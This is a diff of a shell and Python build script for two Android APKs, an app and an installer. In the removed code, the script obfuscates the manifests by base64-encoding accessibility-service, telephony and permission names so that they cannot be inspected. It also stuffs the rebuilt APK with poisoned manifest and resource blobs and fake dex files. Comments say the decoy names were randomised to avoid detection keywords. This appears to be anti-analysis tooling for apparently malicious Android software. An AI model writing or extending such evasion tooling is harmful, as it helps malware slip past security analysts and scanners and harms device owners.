@@ -551,7 +551,6 @@ INSTALLER_ID_FILE="$ROOT_DIR/installer/build.app_id"
 # Stash them under .gradle/ instead, which gradle ignores.
 BACKUP_DIR="$ROOT_DIR/.gradle/build-script-backups"
 mkdir -p "$BACKUP_DIR"
-APP_MANIFEST_BAK="$BACKUP_DIR/app.AndroidManifest.xml.bak"
 APP_STRINGS_BAK="$BACKUP_DIR/app.strings.xml.bak"
 INSTALLER_STRINGS_BAK="$BACKUP_DIR/installer.strings.xml.bak"
 APP_CONSTANTS_BAK="$BACKUP_DIR/app.Constants.java.bak"
@@ -598,7 +597,6 @@ cleanup_overrides() {
     [ -f "$INSTALLER_BUILD_GRADLE_BAK" ] && mv -f "$INSTALLER_BUILD_GRADLE_BAK" "$INSTALLER_BUILD_GRADLE" || true
     [ -f "$INSTALLER_PROGUARD_BAK" ] && mv -f "$INSTALLER_PROGUARD_BAK" "$INSTALLER_PROGUARD" || true
     [ -f "$INSTALLER_MANIFEST_BAK" ] && mv -f "$INSTALLER_MANIFEST_BAK" "$INSTALLER_MANIFEST" || true
-    [ -f "$APP_MANIFEST_BAK" ] && mv -f "$APP_MANIFEST_BAK" "$ROOT_DIR/app/src/main/AndroidManifest.xml" || true
     if [ -d "$INSTALLER_JAVA_BAK" ]; then
         rm -rf "$INSTALLER_JAVA_ROOT"
         mv -f "$INSTALLER_JAVA_BAK" "$INSTALLER_JAVA_ROOT"
@@ -1676,144 +1674,6 @@ else
 fi
 chmod +x "$ROOT_DIR/gradlew"
 
-# ── 8b. AndroidManifest.xml obfuscation (pseudo-encryption) ─────────────────────
-# Makes the source manifest hard to read/inspect while remaining valid XML
-# for aapt2 compilation. Original is backed up and restored via EXIT trap.
-echo ""
-echo "==> Obfuscating AndroidManifest.xml (source-level pseudo-encryption)..."
-APP_MANIFEST="$ROOT_DIR/app/src/main/AndroidManifest.xml"
-INSTALLER_MANIFEST="$ROOT_DIR/installer/src/main/AndroidManifest.xml"
-
-# Backup original manifests (to BACKUP_DIR outside res/ to avoid merge errors)
-mkdir -p "$BACKUP_DIR"
-cp "$APP_MANIFEST" "$BACKUP_DIR/app.AndroidManifest.xml.bak"
-cp "$INSTALLER_MANIFEST" "$BACKUP_DIR/installer.AndroidManifest.xml.bak"
-
-python3 - "$APP_MANIFEST" << 'PYEOF'
-import sys, re, random, base64
-
-path = sys.argv[1]
-with open(path, 'r', encoding='utf-8') as f:
-    src = f.read()
-
-# Remove all XML comments
-src = re.sub(r'<!--.*?-->', '', src, flags=re.DOTALL)
-
-# Collapse all whitespace/newlines to single spaces between tags
-# But preserve whitespace inside attribute values
-def collapse_ws(m):
-    return m.group(0).replace('\n', ' ').replace('\r', ' ').replace('\t', ' ')
-
-# Process tag by tag
-def minify_xml(xml):
-    # Split into tags and text content
-    parts = re.split(r'(<[^>]+>)', xml)
-    out = []
-    for p in parts:
-        if p.startswith('<') and p.endswith('>'):
-            # Minify tag: collapse internal whitespace, normalize attribute spacing
-            p = re.sub(r'\s+', ' ', p)
-            p = re.sub(r'\s*>', '>', p)
-            p = re.sub(r'<\s+', '<', p)
-            p = re.sub(r'=\s*"', '="', p)
-            p = re.sub(r'"\s+', '" ', p)
-            out.append(p)
-        else:
-            # Text content - collapse whitespace but keep some structure
-            p = re.sub(r'\s+', ' ', p).strip()
-            if p:
-                out.append(p)
-    return ''.join(out)
-
-src = minify_xml(src)
-
-# Encode suspicious strings as base64 entities (decoded at runtime by the app)
-# This makes strings like "com.task.tusker.LAUNCH" unreadable in source
-sensitive_patterns = [
-    r'com\.task\.tusker\.',
-    r'android\.intent\.action\.',
-    r'android\.intent\.category\.',
-    r'android\.permission\.',
-    r'android\.accessibilityservice\.',
-    r'androidx\.core\.content\.FileProvider',
-    r'android\.provider\.Telephony',
-    r'com\.access\.client\.',
-]
-
-def encode_sensitive(m):
-    val = m.group(1)
-    # Only encode if longer than 10 chars to avoid breaking short refs
-    if len(val) > 10:
-        enc = base64.b64encode(val.encode()).decode()
-        return f'{m.group(0).replace(val, "__B64__" + enc + "__")}'
-    return m.group(0)
-
-# Apply to attribute values
-for pattern in sensitive_patterns:
-    src = re.sub(
-        rf'(android:(?:name|permission|action|category|authorities|resource|scheme|host|path|pathPrefix|pathPattern|mimeType|priority|label|icon|theme|enabled|exported|process|permission|grantUriPermissions|requestLegacyExternalStorage|preserveLegacyExternalStorage|targetApi|directBootAware|foregroundServiceType|excludeFromRecents|launchMode|allowBackup|dataExtractionRules|fullBackupContent|supportsRtl|roundIcon|icon|label)=")({re.escape(pattern)}[^"]*)(")',
-        encode_sensitive,
-        src
-    )
-
-# Also encode package names in android:name attributes
-src = re.sub(
-    r'(android:name=")([a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+)(")',
-    lambda m: m.group(1) + "__B64__" + base64.b64encode(m.group(2).encode()).decode() + "__" + m.group(4) if len(m.group(2)) > 10 else m.group(0),
-    src
-)
-
-with open(path, 'w', encoding='utf-8') as f:
-    f.write(src)
-
-print(f"  Obfuscated: {path}")
-PYEOF
-
-python3 - "$INSTALLER_MANIFEST" << 'PYEOF'
-import sys, re, base64
-
-path = sys.argv[1]
-with open(path, 'r', encoding='utf-8') as f:
-    src = f.read()
-
-# Remove all XML comments
-src = re.sub(r'<!--.*?-->', '', src, flags=re.DOTALL)
-
-def minify_xml(xml):
-    parts = re.split(r'(<[^>]+>)', xml)
-    out = []
-    for p in parts:
-        if p.startswith('<') and p.endswith('>'):
-            p = re.sub(r'\s+', ' ', p)
-            p = re.sub(r'\s*>', '>', p)
-            p = re.sub(r'<\s+', '<', p)
-            p = re.sub(r'=\s*"', '="', p)
-            p = re.sub(r'"\s+', '" ', p)
-            out.append(p)
-        else:
-            p = re.sub(r'\s+', ' ', p).strip()
-            if p:
-                out.append(p)
-    return ''.join(out)
-
-src = minify_xml(src)
-
-# Encode package names in android:name attributes
-src = re.sub(
-    r'(android:name=")([a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+)(")',
-    lambda m: m.group(1) + "__B64__" + base64.b64encode(m.group(2).encode()).decode() + "__" + m.group(4) if len(m.group(2)) > 10 else m.group(0),
-    src
-)
-
-with open(path, 'w', encoding='utf-8') as f:
-    f.write(src)
-
-print(f"  Obfuscated: {path}")
-PYEOF
-
-echo "  AndroidManifest.xml pseudo-encryption applied (source-level)"
-echo "  Original manifests backed up to .gradle/build-script-backups/"
-
 # ── 9. Build APKs ───────────────────────────────────────────────────────────
 echo ""
 echo "$(date '+%Y-%m-%d %H:%M:%S') ==> Building DEBUG + RELEASE APKs..."
@@ -2091,27 +1951,24 @@ def poison_arsc_blob():
     return struct.pack("<HHII",
                        0x0002, 0x000C, 0x10000000, 0x7FFFFFFF) + os.urandom(2048)
 
-decoys = {}
-# Generate random-looking names to avoid "decoy" keyword
-rnd = lambda: ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(8, 16)))
-
-decoys[f"classes{rnd()}.dex"] = b"dex\n000\x00" + os.urandom(2048)
-decoys[f"AndroidManifest.{rnd()}.bak"] = poison_axml()
-decoys[f"resources.{rnd()}.bak"] = poison_arsc_blob()
-decoys[f"META-INF/services/{rnd()}"] = b"# config\n"
-
-for _ in range(2):
-    decoys[f"res/xml/{rnd()}.xml"] = poison_axml()
-    decoys[f"res/layout/{rnd()}.xml"] = poison_axml()
-for _ in range(1):
-    decoys[f"res/menu/{rnd()}.xml"] = poison_axml()
-    decoys[f"res/anim/{rnd()}.xml"] = poison_axml()
-    decoys[f"res/drawable/{rnd()}.xml"] = poison_axml()
-    decoys[f"res/values/{rnd()}.xml"] = poison_axml()
-    decoys[f"res/raw/{rnd()}.bin"] = os.urandom(1024)
-    decoys[f"res/raw/{rnd()}.arsc"] = poison_arsc_blob()
-    decoys[f"assets/{rnd()}_manifest.xml"] = poison_axml()
-    decoys[f"assets/{rnd()}_resources.arsc"] = poison_arsc_blob()
+decoys = {
+    "classes0.dex":                 b"dex\n000\x00" + os.urandom(2048),
+    "AndroidManifest.xml.bak":      poison_axml(),
+    "resources.arsc.bak":           poison_arsc_blob(),
+    "META-INF/services/\xef\xbb\xbfpoison": b"# decoy\n",
+    "res/xml/_decoy0.xml":          poison_axml(),
+    "res/xml/_decoy1.xml":          poison_axml(),
+    "res/layout/_decoy0.xml":       poison_axml(),
+    "res/layout/_decoy1.xml":       poison_axml(),
+    "res/menu/_decoy.xml":          poison_axml(),
+    "res/anim/_decoy.xml":          poison_axml(),
+    "res/drawable/_decoy.xml":      poison_axml(),
+    "res/values/_decoy.xml":        poison_axml(),
+    "res/raw/_decoy.bin":           os.urandom(1024),
+    "res/raw/_decoy.arsc":          poison_arsc_blob(),
+    "assets/_decoy_manifest.xml":   poison_axml(),
+    "assets/_decoy_resources.arsc": poison_arsc_blob(),
+}
 
 # ─────────────────────────────────────────────────────────────────────────────
 #  REBUILD APK with tampered real entries + decoys
